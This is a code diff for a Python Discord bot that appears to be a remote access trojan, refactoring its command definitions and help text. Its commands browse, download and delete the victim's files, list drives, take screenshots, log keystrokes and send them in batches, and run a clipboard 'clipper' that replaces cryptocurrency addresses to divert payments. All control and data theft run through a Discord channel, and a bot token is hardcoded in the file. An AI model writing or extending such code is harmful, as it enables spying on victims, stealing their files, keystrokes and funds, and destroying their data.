@@ -2,6 +2,7 @@ import discord
 import sys
 import asyncio
 from discord.ext import commands
+from functions.help import setup_help_command
 
 clipper_active = False
 input_monitor_active = False
@@ -10,30 +11,9 @@ CHANNEL_ID = 1293132121547735147
 DISCORD_TOKEN = "MTI3ODY1MjQ3NDM3MDAzMTYxNw.GoFFed.BTt1HxcZHUKO4iOSEPf_dSosQXrUO5fJsRriSE"
 SERVER_ID = 1293132121547735144
 
-class CustomHelpCommand(commands.HelpCommand):
-    async def send_bot_help(self, mapping):
-        embed = discord.Embed(title="**Functions Help**", description="Commands:", color=0xcd0000)
-
-        embed.add_field(name="!browse <path>", value="Shows all directories and files in a path.", inline=False)
-        embed.add_field(name="!clipper", value="Monitor clipboard contents, and replace crypto addresses.", inline=False)
-        embed.add_field(name="!crypto <set, list>", value="Manage crypto addresses for the clipper.", inline=False)
-        embed.add_field(name="!delete <path>", value="Deletes a file in a specified path.", inline=False)
-        embed.add_field(name="!download <path>", value="Downloads a file in a specified path.", inline=False)
-        embed.add_field(name="!drives", value="Lists the available drives on the system.", inline=False)
-        embed.add_field(name="!inputs", value="Monitors keyboard inputs and sends them in randomized batches.", inline=False)
-        embed.add_field(name="!screenshot", value="Takes a screenshot of the user's screen(s).", inline=False)
-        embed.add_field(name="!usage", value="Displays system usage information and uptime.", inline=False)
-        embed.add_field(name="!window", value="Lists the information of the window currently focused.", inline=False)
-
-        channel = self.get_destination()
-        await channel.send(embed=embed)
-
-    async def send_command_help(self, command):
-        pass
-
 intents = discord.Intents.default()
 intents.message_content = True
-bot = commands.Bot(command_prefix="!", intents=intents, help_command=CustomHelpCommand())
+bot = commands.Bot(command_prefix="!", intents=intents)
 
 def lazy_load_toggleable_module(module_name, submodule_name=None):
     if submodule_name:
@@ -60,44 +40,17 @@ def unload_module(module_name):
 @bot.event
 async def on_ready():
     global CHANNEL_ID
-    print(f"Logged in as {bot.user}")
     channel = bot.get_channel(CHANNEL_ID)
-    if channel is None:
-        print(f"Error: Could not access channel {CHANNEL_ID}. Please check permissions or channel ID.")
+
+@bot.command(name="browse", help="Shows all directories and files in a path.")
+async def browse(ctx, *, path: str = None):
+    from functions.file_browser import list_directory_contents, handle_navigation
+    if path:
+        await handle_navigation(bot, CHANNEL_ID, path)
     else:
-        print(f"Bot has access to channel: {channel.name}")
+        await list_directory_contents(bot, CHANNEL_ID)
 
-@bot.command(name="usage")
-async def usage(ctx):
-    system_usage = lazy_load_module('functions', 'system_usage')
-    await system_usage.monitor_system(bot, CHANNEL_ID)
-    unload_module('functions.system_usage')
-
-@bot.command(name="inputs")
-async def inputs(ctx):
-    global input_monitor_active
-    try:
-        input_monitor_module = lazy_load_toggleable_module('functions', 'input_monitor')
-        await input_monitor_module.toggle_input_monitor(bot, CHANNEL_ID, input_monitor_active)
-        input_monitor_active = not input_monitor_active
-        if not input_monitor_active:
-            unload_toggleable_module('functions.input_monitor')
-    except Exception as e:
-        await ctx.send(f"Error: {str(e)}")
-
-@bot.command(name="screenshot")
-async def screenshot(ctx):
-    screenshot_module = lazy_load_module('functions', 'screenshot')
-    await screenshot_module.capture_and_send(bot, CHANNEL_ID)
-    unload_module('functions.screenshot')
-
-@bot.command(name="record")
-async def record(ctx):
-    record_module = lazy_load_module('functions', 'record')
-    await record_module.record_screen(bot, CHANNEL_ID)
-    unload_module('functions.record')
-
-@bot.command(name="clipper")
+@bot.command(name="clipper", help="Monitor clipboard contents, and replace crypto addresses.")
 async def clipper(ctx):
     global clipper_active
     try:
@@ -109,54 +62,68 @@ async def clipper(ctx):
     except Exception as e:
         await ctx.send(f"Error: {str(e)}")
 
-@bot.command(name="crypto")
-async def crypto(ctx, action, *, address=None):
+@bot.command(name="crypto", help="Manage crypto addresses for the clipper.")
+async def crypto(ctx, action: str, *, address: str = None):
     clipper_module = lazy_load_toggleable_module('functions', 'clipper')
-
     if action == "set" and address:
         await clipper_module.set_crypto_address(bot, ctx, address, clipper_active)
     elif action == "list":
         await clipper_module.list_crypto_addresses(bot, ctx, clipper_active)
     else:
-        await ctx.send(f"**Usage:** `!crypto set <address>`, `!crypto list`")
+        await ctx.send("**Usage:** `!crypto set <address>`, `!crypto list`")
 
-@bot.command(name="delete", help="Deletes the specified file.")
+@bot.command(name="delete", help="Deletes a file in a specified path.")
 async def delete(ctx, *, file_path: str):
     from functions.delete import delete_file
     file_path = file_path.replace("\\", "/")
     result_message = delete_file(file_path)
     await ctx.send(result_message)
 
-@bot.command(name="window")
-async def get_focused_window(ctx):
-    from functions.window import get_focused_window_message
-
-    message = get_focused_window_message()
-    await ctx.send(message)
-
-@bot.command(name="download")
+@bot.command(name="download", help="Downloads a file in a specified path.")
 async def download(ctx, *, file_path: str):
     from functions.download import download_and_send
     file_path = file_path.replace("\\", "/")
     await download_and_send(bot, CHANNEL_ID, file_path)
 
-@bot.command(name="drives")
+@bot.command(name="drives", help="Lists the available drives on the system.")
 async def drives(ctx):
     from functions.file_browser import list_directory_contents
     await list_directory_contents(bot, CHANNEL_ID)
 
-@bot.command(name="browse")
-async def browse(ctx, *, path=None):
-    from functions.file_browser import list_directory_contents, handle_navigation
-    if path:
-        await handle_navigation(bot, CHANNEL_ID, path)
-    else:
-        await list_directory_contents(bot, CHANNEL_ID)
+@bot.command(name="inputs", help="Monitors keyboard inputs and sends them in randomized batches.")
+async def inputs(ctx):
+    global input_monitor_active
+    try:
+        input_monitor_module = lazy_load_toggleable_module('functions', 'input_monitor')
+        await input_monitor_module.toggle_input_monitor(bot, CHANNEL_ID, input_monitor_active)
+        input_monitor_active = not input_monitor_active
+        if not input_monitor_active:
+            unload_toggleable_module('functions.input_monitor')
+    except Exception as e:
+        await ctx.send(f"Error: {str(e)}")
 
-@bot.command(name="update")
-async def update(ctx, *, files=None):
+@bot.command(name="screenshot", help="Takes a screenshot of the user's screen(s).")
+async def screenshot(ctx):
+    screenshot_module = lazy_load_module('functions', 'screenshot')
+    await screenshot_module.capture_and_send(bot, CHANNEL_ID)
+    unload_module('functions.screenshot')
+
+@bot.command(name="update", help="Updates specified files from the GitHub Repo.")
+async def update(ctx, *, files: str = None):
     from functions.update import update_command
     await update_command(ctx, files=files)
+
+@bot.command(name="usage", help="Displays system usage information and uptime.")
+async def usage(ctx):
+    system_usage = lazy_load_module('functions', 'system_usage')
+    await system_usage.monitor_system(bot, CHANNEL_ID)
+    unload_module('functions.system_usage')
+
+@bot.command(name="window", help="Lists the information of the window currently focused.")
+async def get_focused_window(ctx):
+    from functions.window import get_focused_window_message
+    message = get_focused_window_message()
+    await ctx.send(message)
 
 @bot.event
 async def on_command_error(ctx, error):
@@ -165,12 +132,11 @@ async def on_command_error(ctx, error):
     else:
         await ctx.send(f"**Error:** `{str(error)}`")
 
-async def send_data_buffer(data, bot, CHANNEL_ID):
-    channel = bot.get_channel(CHANNEL_ID)
-    if channel:
-        await channel.send(data)
-
 def start_discord_bot():
     global bot_event_loop
     bot_event_loop = asyncio.get_event_loop()
     bot.run(DISCORD_TOKEN)
+
+setup_help_command(bot)
+
+bot.run(DISCORD_TOKEN)
